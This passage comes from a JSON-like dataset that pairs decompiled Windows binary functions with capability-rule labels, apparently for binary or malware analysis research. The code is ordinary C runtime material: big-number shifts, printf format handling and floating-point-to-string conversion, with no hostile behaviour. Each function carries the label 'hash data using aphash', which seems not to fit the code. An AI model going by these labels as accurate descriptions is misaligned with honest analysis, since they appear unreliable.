iVar19 + 1;\n        }\n        uVar10 = (puVar14 + -1) * 0x20 + iVar19;\n    }\n    if (var_91ch == NULL) {\n        uVar13 = 0;\n    }\n    else {\n        uVar13 = (&var_744h)[var_91ch];\n        var_944h = 0;\n        iVar19 = 0x1f;\n        if (uVar13 != 0) {\n            for (; uVar13 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar13 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        uVar13 = (var_91ch + -1) * 0x20 + iVar19;\n    }\n    var_920h = -(uVar10 < uVar13) & uVar13 - uVar10;\n    puVar11 = var_91ch;\n    if (var_920h != NULL) {\n        puVar11 = var_920h & 0x1f;\n        uVar13 = var_920h >> 5;\n        var_930h = 0x20 - puVar11;\n        var_944h = uVar13;\n        var_940h = puVar11;\n        iVar19 = fcn.00404147();\n        uVar10 = (&var_3a4h)[puVar14];\n        var_924h = iVar19 + -1;\n        iVar19 = 0x1f;\n        if (uVar10 != 0) {\n            for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        var_934h = ~var_924h;\n        var_95ch = NULL;\n        if (uVar10 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        if ((uVar13 + puVar14 < 0x74) && (var_95ch = (0x20 - iVar19 < puVar11) + uVar13 + puVar14,  var_95ch < 0x74)) {\n            var_928h = uVar13 - 1;\n            var_938h = var_95ch + -1;\n            if (var_938h != var_928h) {\n                puVar12 = var_938h - uVar13;\n                puVar11 = &var_3a4h + puVar12;\n                do {\n                    if (puVar12 < puVar14) {\n                        var_92ch = puVar11[1];\n                    }\n                    else {\n                        var_92ch = NULL;\n                    }\n                    if (puVar12 - 1U < puVar14) {\n                        uVar10 = *puVar11;\n                    }\n                    else {\n                        uVar10 = 0;\n                    }\n                    puVar11 = puVar11 + -1;\n                    (&var_3a0h)[var_938h] =\n                         (uVar10 & var_934h) >> (var_930h & 0x1f) | (var_92ch & var_924h) << (var_940h & 0x1f);\n                    var_938h = var_938h + -1;\n                    puVar12 = puVar12 + -1;\n                    puVar14 = var_3a4h;\n                    uVar13 = var_944h;\n                } while (var_938h != var_928h);\n            }\n            if (uVar13 != 0) {\n                puVar15 = &var_3a0h;\n                for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar15 = 0;\n                    puVar15 = puVar15 + 1;\n                }\n            }\n            var_3a4h = var_95ch;\n            puVar11 = var_91ch;\n            puVar14 = var_3a4h;\n        }\n        else {\n            var_3a4h = NULL;\n            var_b2ch = NULL;\n            fcn.004bc06c(&var_3a0h, 0x1cc, &var_b28h, 0);\n            puVar11 = var_744h;\n            puVar14 = var_3a4h;\n        }\n    }\n    var_94ch = var_94ch - var_93ch;\n    puVar12 = var_94ch;\n    if (var_93ch != NULL) {\n        if (var_94ch < var_920h) {\n            bVar16 = var_958h != var_954h;\n            uVar2 = *(var_948h + 0xc2);\n            goto code_r0x004b9b3e;\n        }\n        puVar12 = var_94ch - var_920h;\n    }\n    if (puVar14 <= puVar11) {\n        if (puVar14 < puVar11) {\ncode_r0x004b98bb:\n            var_920h = var_920h + 1;\n        }\n        else {\n            puVar7 = puVar14 + -1;\n            if (puVar7 != 0xffffffff) {\n                do {\n                    if ((&var_3a0h)[puVar7] != (&var_740h)[puVar7]) break;\n                    puVar7 = puVar7 + -1;\n                } while (puVar7 != 0xffffffff);\n                if ((puVar7 != 0xffffffff) &&\n                   ((&var_3a0h)[puVar7] < (&var_740h)[puVar7] || (&var_3a0h)[puVar7] == (&var_740h)[puVar7]))\n                goto code_r0x004b98bb;\n            }\n        }\n    }\n    puVar11 = puVar12 & 0x1f;\n    uVar13 = puVar12 >> 5;\n    var_95ch = 0x20 - puVar11;\n    var_934h = puVar11;\n    iVar19 = fcn.00404147();\n    uVar10 = (&var_3a4h)[puVar14];\n    var_940h = iVar19 + -1;\n    iVar19 = 0x1f;\n    if (uVar10 != 0) {\n        for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n        }\n    }\n    var_944h = ~var_940h;\n    var_92ch = NULL;\n    if (uVar10 == 0) {\n        iVar19 = 0;\n    }\n    else {\n        iVar19 = iVar19 + 1;\n    }\n    if ((uVar13 + puVar14 < 0x74) && (var_930h = (0x20 - iVar19 < puVar11) + uVar13 + puVar14,  var_930h < 0x74)) {\n        var_938h = var_930h + -1;\n        if (var_938h != uVar13 - 1) {\n            puVar12 = var_938h - uVar13;\n            puVar11 = &var_3a4h + puVar12;\n            do {\n                if (puVar12 < puVar14) {\n                    var_92ch = puVar11[1];\n                }\n                else {\n                    var_92ch = NULL;\n                }\n                if (puVar12 - 1U < puVar14) {\n                    uVar10 = *puVar11;\n                }\n                else {\n                    uVar10 = 0;\n                }\n                puVar11 = puVar11 + -1;\n                (&var_3a0h)[var_938h] =\n                     (uVar10 & var_944h) >> (var_95ch & 0x1f) | (var_92ch & var_940h) << (var_934h & 0x1f);\n                var_938h = var_938h + -1;\n                puVar12 = puVar12 + -1;\n                puVar14 = var_3a4h;\n            } while (var_938h != uVar13 - 1);\n        }\n        var_3a4h = var_930h;\n        if (uVar13 != 0) {\n            puVar15 = &var_3a0h;\n            for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n                *puVar15 = 0;\n                puVar15 = puVar15 + 1;\n            }\n        }\n    }\n    else {\n        var_3a4h = NULL;\n        var_b2ch = NULL;\n        fcn.004bc06c(&var_3a0h, 0x1cc, &var_b28h, 0);\n    }\n    uVar17 = fcn.00404818(&var_3a4h, &var_744h);\n    uVar13 = uVar17 >> 0x20;\n    uVar10 = uVar17;\n    var_924h = var_924h & 0xffffff00 | var_3a4h == NULL;\n    if (uVar13 == 0) {\n        iVar19 = 0x1f;\n        if (uVar10 != 0) {\n            for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar10 == 0) {\n            puVar14 = NULL;\n        }\n        else {\n            puVar14 = iVar19 + 1;\n        }\n    }\n    else {\n        iVar19 = 0x1f;\n        if (uVar13 != 0) {\n            for (; uVar13 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar13 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        puVar14 = iVar19 + 0x20;\n    }\n    if (var_94ch < puVar14) {\n        if (var_3a4h == NULL) {\n            iVar18 = fcn.00404147();\n            var_924h = CONCAT31(var_924h._1_3_, 1);\n            if ((iVar18 - 1U & uVar17) != 0) goto code_r0x004b9a8b;\n        }\n        else {\ncode_r0x004b9a8b:\n            var_924h = var_924h & 0xffffff00;\n        }\n        uVar17 = fcn.00401b8b();\n    }\n    iVar18 = fcn.00404147();\n    if (var_93ch == NULL) {\n        puVar7 = ~var_920h;\n    }\n    else {\n        puVar7 = var_93ch + -2;\n    }\n    fcn.00406906(uVar17 + iVar18, uVar17 + iVar18 >> 0x20, puVar7, *(var_948h + 0xc2), var_924h, var_950h);\ncode_r0x004b9b4d:\n    fcn.004030bc(var_b2ch);\n    return;\n}\n",
        "token_count": 15411
    },
    "00403eb3": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403eb3(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.004037d8(8, 0);\n    return;\n}\n",
        "token_count": 92
    },
    "0040511e": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040511e(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x004a1723:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x004a1727:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a172a:\n            cVar5 = fcn.00403f71(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a16cf:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a172a;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x004a16e3;\n                if (uVar7 < 0x45) goto code_r0x004a18c2;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x004a18c2;\n                    goto code_r0x004a16b7;\n                }\n            }\ncode_r0x004a1733:\n            cVar5 = fcn.004064d3();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00403fc6();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x004a1733;\n            if (uVar7 != 99) goto code_r0x004a18c2;\ncode_r0x004a16e3:\n            cVar5 = fcn.00404345(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00405920();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x004a1733;\n            if (uVar7 == 0x69) goto code_r0x004a1723;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.00401c35();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x004a18c2;\n                cVar5 = fcn.004057bd();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x004a18c2;\n                arg_ch_00 = 0;\n                goto code_r0x004a16cf;\n            }\n            goto code_r0x004a1727;\n        }\ncode_r0x004a16b7:\n        cVar5 = fcn.00402f18();\n    }\n    if (((cVar5 == '\\0') || (cVar5 = fcn.004035d0(),  cVar5 != '\\0')) || (*(param_1 + 0x30) != '\\0'))\n    goto code_r0x004a18c2;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x004a17cd;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a17cd:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.004040ed(&var_ch, arg_ch, param_1 + 0x18, param_1 + 0xc);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00405bd2(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.0040435e(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x004a18c2:\n    fcn.004030bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 1759
    },
    "004043fe": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004043fe(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00401e33(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "0040468d": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040468d(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00402e96(8, 0);\n    return;\n}\n",
        "token_count": 92
    },
    "004048d1": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint32_t fcn.004048d1(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUStatusWord;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_FPUStatusWord & 0x3f;\n    uVar1 = (uVar1 >> 1 & 1) << 5 | (uVar1 >> 2 & 1) << 3 | (uVar1 >> 3 & 1) << 2 | (uVar1 >> 4 & 1) * 2 |\n            (in_FPUStatusWord & 1) << 4 | uVar1 >> 5;\n    if (*0x573c4c < 1) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = in_MXCSR & 0x3f;\n    }\n    uVar2 = (uVar2 >> 1 & 1) << 5 | (uVar2 >> 2 & 1) << 3 | (uVar2 >> 3 & 1) << 2 | (uVar2 >> 4 & 1) * 2 |\n            (uVar2 & 1) << 4 | uVar2 >> 5;\n    return (uVar2 << 8 | uVar1) << 0x10 | uVar2 | uVar1;\n}\n",
        "token_count": 327
    },
    "004055a6": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_964h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004055a6(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    char **ppcVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    bool bVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    char *pcVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint32_t *puVar16;\n    uint *puVar17;\n    uint32_t uVar18;\n    uint32_t *puVar19;\n    uint *puVar20;\n    char *pcVar21;\n    bool bVar22;\n    uint *var_964h;\n    uint var_960h;\n    uint32_t var_794h;\n    uint var_790h;\n    uint var_788h;\n    uint *var_784h;\n    uint *var_77ch;\n    uint32_t var_778h;\n    uint *var_774h;\n    uint *var_770h;\n    uint32_t var_76ch;\n    uint32_t *var_768h;\n    uint *var_764h;\n    uint32_t *var_760h;\n    uint32_t var_75ch;\n    uint32_t var_758h;\n    uint *var_754h;\n    uint *var_750h;\n    uint *var_74ch;\n    uint *var_748h;\n    uint *var_744h;\n    uint var_740h;\n    uint *var_574h;\n    uint32_t var_570h;\n    uint var_56ch;\n    uint *var_3a4h;\n    uint *var_3a0h;\n    char *apcStack928 [114];\n    uint32_t *var_1d4h;\n    uint *var_1d0h;\n    uint32_t var_1cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_784h = arg_14h;\n    var_764h = arg_18h;\n    fcn.004030fd(&var_790h);\n    var_788h._0_1_ = (var_790h & 0x1f) != 0x1f;\n    if (var_788h) {\n        fcn.00405a9c(&var_790h);\n    }\n    uVar12 = arg_ch;\n    uVar6 = 0x20;\n    if ((arg_ch < 1) && (arg_ch < 0)) {\n        uVar6 = 0x2d;\n    }\n    *var_784h = uVar6;\n    var_784h[2] = var_764h;\n    fcn.00405b50(&var_794h, 0, 0);\n    if (((uVar12 & 0x7ff00000) == 0) && (((arg_8h | uVar12 & 0xfffff) == 0 || ((var_794h & 0x1000000) != 0)))) {\n        pcVar21 = 0x55aebc;\n        var_784h[1] = 0;\n        goto code_r0x004dac07;\n    }\n    iVar7 = fcn.00404507(&arg_8h);\n    if (iVar7 != 0) {\n        var_784h[1] = 1;\n    }\n    if (iVar7 == 1) {\n        iVar7 = fcn.0040605a(var_764h, arg_1ch, \"1#INF\");\n    }\n    else {\n        if (iVar7 == 2) {\n            pcVar21 = \"1#QNAN\";\n        }\n        else if (iVar7 == 3) {\n            pcVar21 = \"1#SNAN\";\n        }\n        else {\n            if (iVar7 != 4) {\n                arg_ch = uVar12 & 0x7fffffff;\n                var_77ch = NULL;\n                var_778h = arg_10h + 1;\n                _var_75ch = CONCAT44(uVar12, arg_8h) & 0x7fffffffffffffff;\n                var_758h = _var_75ch >> 0x20;\n                uVar12 = var_758h >> 0x14;\n                if (uVar12 != 0) {\n                    uVar18 = 0;\n                    iVar7 = 0x100000;\n                }\n                else {\n                    iVar7 = 0;\n                    uVar18 = uVar12;\n                }\n                var_750h = uVar12 == 0;\n                var_774h = var_75ch + uVar18;\n                var_1cch = (var_758h & 0xfffff) + iVar7 + CARRY4(var_75ch, uVar18);\n                var_748h = var_750h + uVar12;\n                fcn.0040530d();\n                fcn.00406311();\n                var_76ch = fcn.00401d6b();\n                if ((var_76ch == 0x7fffffff) || (var_76ch == 0x80000000)) {\n                    var_76ch = 0;\n                }\n                var_1d0h = var_774h;\n                var_760h = (var_1cch != 0) + 1;\n                var_1d4h = var_760h;\n                if (var_748h < 0x433) {\n                    if (var_748h == 0x35) {\ncode_r0x004db204:\n                        _var_75ch = _var_75ch & 0xffffffff;\n                        uVar12 = (&var_1d0h)[var_1cch != 0];\n                        iVar7 = 0x1f;\n                        if (uVar12 != 0) {\n                            for (; uVar12 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n                            }\n                        }\n                        if (uVar12 == 0) {\n                            iVar7 = 0;\n                        }\n                        else {\n                            iVar7 = iVar7 + 1;\n                        }\n                        puVar15 = (iVar7 == 0x20) + var_760h;\n                        if (puVar15 < 0x74) {\n                            puVar16 = puVar15 + -1;\n                            if (puVar16 != 0xffffffff) {\n                                puVar19 = puVar15 + -2;\n                                puVar13 = var_760h;\n                                do {\n                                    if (puVar16 < puVar13) {\n                                        iVar7 = (&var_1d0h)[puVar16];\n                                    }\n                                    else {\n                                        iVar7 = 0;\n                                    }\n                                    if (puVar19 < puVar13) {\n                                        uVar12 = (&var_1d4h)[puVar16];\n                                    }\n                                    else {\n                                        uVar12 = 0;\n                                    }\n                                    (&var_1d0h)[puVar16] = uVar12 >> 0x1f | iVar7 * 2;\n                                    puVar16 = puVar16 + -1;\n                                    puVar19 = puVar19 + -1;\n                                    puVar13 = var_1d4h;\n                                } while (puVar16 != 0xffffffff);\n                            }\n                        }\n                        else {\n                            var_574h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004dc577(&var_1d0h, 0x1cc, &var_570h, 0);\n                            puVar15 = var_1d4h;\n                        }\n                        var_1d4h = puVar15;\n                        uVar12 = 0x434 - var_748h;\n                        uVar18 = uVar12 >> 5;\n                        fcn.00403189(&var_570h);\n                        (&var_570h)[uVar18] = 1 << (uVar12 & 0x1f);\n                    }\n                    else {\n                        var_570h = 0;\n                        var_56ch = 0x100000;\n                        var_574h = 0x2;\n                        if (var_1cch == 0) goto code_r0x004db204;\n                        iVar7 = 0;\n                        do {\n                            if (*(&var_570h + iVar7) != *(&var_1d0h + iVar7)) goto code_r0x004db204;\n                            iVar7 = iVar7 + 4;\n                        } while (iVar7 != 8);\n                        iVar7 = 0x1f;\n                        if (var_1cch != 0) {\n                            for (; var_1cch >> iVar7 == 0; iVar7 = iVar7 + -1) {\n                            }\n                        }\n                        _var_75ch = _var_75ch & 0xffffffff;\n                        if (var_1cch == 0) {\n                            iVar7 = 0;\n                        }\n                        else {\n                            iVar7 = iVar7 + 1;\n                        }\n                        puVar15 = (0x20U - iVar7 < 2) + var_760h;\n                        if (puVar15 < 0x74) {\n                            puVar16 = puVar15 + -1;\n                            if (puVar16 != 0xffffffff) {\n                                puVar19 = puVar15 + -2;\n                                puVar13 = var_760h;\n                                do {\n                                    if (puVar16 < puVar13) {\n                                        iVar7 = (&var_1d0h)[puVar16];\n                                    }\n                                    else {\n                                        iVar7 = 0;\n                                    }\n                                    if (puVar19 < puVar13) {\n                                        uVar12 = (&var_1d4h)[puVar16];\n                                    }\n                                    else {\n                                        uVar12 = 0;\n                                    }\n                                    (&var_1d0h)[puVar16] = uVar12 >> 0x1e | iVar7 << 2;\n                                    puVar16 = puVar16 + -1;\n                                    puVar19 = puVar19 + -1;\n                                    puVar13 = var_1d4h;\n                                } while (puVar16 != 0xffffffff);\n                            }\n                        }\n                        else {\n                            var_574h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004dc577(&var_1d0h, 0x1cc, &var_570h, 0);\n                            puVar15 = var_1d4h;\n                        }\n                        var_1d4h = puVar15;\n                        uVar12 = 0x435 - var_748h;\n                        uVar18 = uVar12 >> 5;\n                        fcn.00403189(&var_570h);\n                        (&var_570h)[uVar18] = 1 << (uVar12 & 0x1f);\n                    }\n                    var_574h = uVar18 + 1;\n                    var_3a4h = var_574h;\n                    fcn.004dc577(&var_3a0h, 0x1cc, &var_570h, var_574h * 4);\n                }\n                else {\n                    var_570h = 0;\n                    var_56ch = 0x100000;\n                    var_574h = 0x2;\n                    if (var_1cch == 0) {\ncode_r0x004daf4f:\n                        var_750h = var_748h + -0x432 & 0x1f;\n                        var_768h = var_748h + -0x432 >> 5;\n                        var_77ch = 0x20 - var_750h;\n                        iVar7 = fcn.00404147();\n                        var_774h = iVar7 - 1;\n                        var_74ch = NULL;\n                        _var_75ch = _var_75ch & 0xffffffff | ~var_774h << 0x20;\n                        uVar12 = (&var_1d4h)[var_760h];\n                        iVar7 = 0x1f;\n                        if (uVar12 != 0) {\n                            for (; uVar12 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n                            }\n                        }\n                        if (uVar12 == 0) {\n                            var_754h = NULL;\n                        }\n                        else {\n                            var_754h = iVar7 + 1;\n                        }\n                        if ((var_760h + var_768h < 0x74) &&\n                           (var_770h = (0x20 - var_754h < var_750h) + var_760h + var_768h,  var_770h < 0x74)) {\n                            var_74ch = var_768h + -1;\n                            var_748h = var_770h + -1;\n                            puVar16 = var_760h;\n                            if (var_748h != var_74ch) {\n                                puVar19 = var_748h - var_768h;\n                                puVar16 = &var_1d4h + puVar19;\n                                do {\n                                    if (puVar19 < var_760h) {\n                                        var_754h = puVar16[1];\n                                    }\n                                    else {\n                                        var_754h = NULL;\n                                    }\n                                    if (puVar19 + -1 < var_760h) {\n                                        uVar12 = *puVar16;\n                                    }\n                                    else {\n                                        uVar12 = 0;\n                                    }\n                                    (&var_1d0h)[var_748h] =\n                                         (uVar12 & ~var_774h) >> (var_77ch & 0x1f) |\n                                         (var_754h & var_774h) << (var_750h & 0x1f);\n                                    var_748h = var_748h + -1;\n                                    puVar16 = puVar16 + -1;\n                                    puVar19 = puVar19 + -1;\n                                    var_760h = var_1d4h;\n                                } while (var_748h != var_74ch);\n                            }\n                            var_760h = puVar16;\n                            var_1d4h = var_770h;\n                            if (var_768h != NULL) {\n                                puVar15 = &var_1d0h;\n                                for (puVar16 = var_768h; puVar16 != NULL; puVar16 = puVar16 + -1) {\n                                    *puVar15 = 0;\n                                    puVar15 = puVar15 + 1;\n                                }\n                            }\n                        }\n                        else {\n                            var_574h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004dc577(&var_1d0h, 0x1cc, &var_570h, 0);\n                        }\n                        var_570h = 2;\n                    }\n                    else {\n                        iVar7 = 0;\n                        do {\n                            if (*(&var_570h + iVar7) != *(&var_1d0h + iVar7)) goto code_r0x004daf4f;\n                            iVar7 = iVar7 + 4;\n                        } while (iVar7 != 8);\n                        var_768h = var_748h + -0x431 & 0x1f;\n                        var_754h = var_748h + -0x431 >> 5;\n                        var_74ch = 0x20 - var_768h;\n                        iVar7 = fcn.00404147();\n                        var_770h = iVar7 + -1;\n                        _var_75ch = _var_75ch & 0xffffffff;\n                        var_774h = ~var_770h;\n                        uVar12 = (&var_1d4h)[var_760h];\n                        iVar7 = 0x1f;\n                        if (uVar12 != 0) {\n                            for (; uVar12 >> iVar7 == 0; iVar7 = iVar7 + -1) {\n                            }\n                        }\n                        if (uVar12 == 0) {\n                            var_750h = NULL;\n                        }\n                        else {\n                            var_750h = iVar7 + 1;\n                        }\n                        if (var_760h + var_754h < 0x74) {\n                            puVar15 = (0x20 - var_750h < var_768h) + var_760h + var_754h;\n                            _var_75ch = _var_75ch | ZEXT48(puVar15) << 0x20;\n                            if (0x73 < puVar15) goto code_r0x004dae09;\n                            var_77ch = var_754h + -1;\n                            var_748h = puVar15 + -1;\n                            puVar16 = var_760h;\n                            if (var_748h != var_77ch) {\n                                puVar19 = var_748h - var_754h;\n                                puVar16 = &var_1d4h + puVar19;\n                                do {\n                                    if (puVar19 < var_760h) {\n                                        var_750h = puVar16[1];\n                                    }\n                                    else {\n                                        var_750h = NULL;\n                                    }\n                                    if (puVar19 + -1 < var_760h) {\n                                        uVar12 = *puVar16;\n                                    }\n                                    else {\n                                        uVar12 = 0;\n                                    }\n                                    (&var_1d0h)[var_748h] =\n                                         (uVar12 & var_774h) >> (var_74ch & 0x1f) |\n                                         (var_750h & var_770h) << (var_768h & 0x1f);\n                                    var_748h = var_748h + -1;\n                                    puVar16 = puVar16 + -1;\n                                    puVar19 = puVar19 + -1;\n                                    var_760h = var_1d4h;\n                                } while (var_748h != var_77ch);\n                            }\n                            var_760h = puVar16;\n                            var_1d4h = puVar15;\n                            if (var_754h != NULL) {\n                                puVar20 = &var_1d0h;\n                                for (puVar15 = var_754h; puVar15 != NULL; puVar15 = puVar15 + -1) {\n                                    *puVar20 = 0;\n                                    puVar20 = puVar20 + 1;\n                                }\n                            }\n                        }\n                        else {\ncode_r0x004dae09:\n                            var_574h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004dc577(&var_1d0h, 0x1cc, &var_570h, 0);\n                        }\n                        var_570h = 4;\n                    }\n                    var_56ch = 0;\n                    var_3a4h = 0x1;\n                    var_574h = 0x1;\n                    fcn.004dc577(&var_3a0h, 0x1cc, &var_570h, 4);\n                }\n                bVar22 = true;\n                var_774h = 0xa;\n                if (var_76ch < 0) {\n                    var_77ch = -var_76ch % 10;\n                    for (var_760h = -var_76ch / 10; var_760h != NULL; var_760h = var_760h - var_768h) {\n                        var_768h = var_760h;\n                        if (0x26 < var_760h) {\n                            var_768h = 0x26;\n                        }\n                        uVar12 = *(var_768h * 4 + 0x5583e6);\n                        uVar18 = *(var_768h * 4 + 0x5583e7);\n                        var_574h = uVar12 + uVar18;\n                        fcn.00403189(&var_570h);\n                        fcn.00405830(&var_570h + uVar12, *(var_768h * 4 + 0x5583e4) * 4 + 0x557910, uVar18 << 2);\n                        if (var_574h < 0x2) {\n                            if (var_570h == 0) {\n                                var_964h = NULL;\n                                var_1d4h = NULL;\n                                fcn.004dc577(&var_1d0h, 0x1cc, &var_960h, 0);\n                            }\n                            else if ((var_570h != 1) && (var_1d4h != NULL)) {\n                                uVar12 = 0;\n                                _var_75ch = _var_75ch & 0xffffffff | ZEXT48(var_1d4h) << 0x20;\n                                puVar15 = NULL;\n                                do {\n                                    uVar18 = (&var_1d0h)[puVar15];\n                                    uVar11 = var_570h * uVar18;\n                                    (&var_1d0h)[puVar15] = uVar11 + uVar12;\n                                    uVar12 = (var_570h * uVar18 >> 0x20) + CARRY4(uVar11, uVar12);\n                                    puVar15 = puVar15 + 1;\n                                } while (puVar15 != var_1d4h);\n                                if (uVar12 == 0) goto code_r0x004db8d3;\n                                if (var_1d4h < 0x73) {\n                                    (&var_1d0h)[var_1d4h] = uVar12;\n                                    var_1d4h = var_1d4h + 1;\n                                    goto code_r0x004db8d3;\n                                }\n                                var_964h = NULL;\n                                var_1d4h = NULL;\n                                fcn.004dc577(&var_1d0h, 0x1cc, &var_960h, 0);\n                                bVar4 = false;\n                                goto code_r0x004dbbcb;\n                            }\ncode_r0x004db8d3:\n                            bVar4 = true;\n                        }\n                        else {\n                            if (var_1d4h < 0x2) {\n                                var_74ch = var_1d0h;\n                                var_1d4h = var_574h;\n                                fcn.004dc577(&var_1d0h, 0x1cc, &var_570h, var_574h << 2);\n                                if (var_74ch == NULL) {\n                                    var_964h = var_74ch;\n                                    var_1d4h = var_74ch;\n                                    puVar15 = &var_960h;\n                                    puVar20 = var_74ch;\n                                    goto code_r0x004dbbb8;\n                                }\n                                if ((var_74ch != 0x1) && (var_1d4h != NULL)) {\n                                    